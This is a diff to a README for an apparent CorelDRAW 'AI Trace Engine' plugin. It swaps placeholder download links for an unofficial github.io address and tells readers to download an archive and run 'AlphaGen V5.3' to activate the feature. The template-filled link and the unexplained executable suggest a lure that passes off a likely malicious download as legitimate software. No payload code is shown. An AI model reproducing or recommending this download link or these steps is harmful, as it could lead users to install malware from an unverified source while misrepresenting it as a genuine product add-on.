@@ -2,13 +2,13 @@
 
 Convert bitmaps into precise vector graphics using CorelDRAW’s AI-Powered Trace Engine — enhanced accuracy, speed, and color control.
 
-[![Download](https://img.shields.io/badge/Download-AI_Trace_Engine-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-AI_Trace_Engine-blueviolet)](https://ai-trace-engine-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://ai-trace-engine-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate AI tracing support  
 4. ✅ Open CorelDRAW, select a bitmap, and choose `Trace Bitmap > AI Trace Engine`
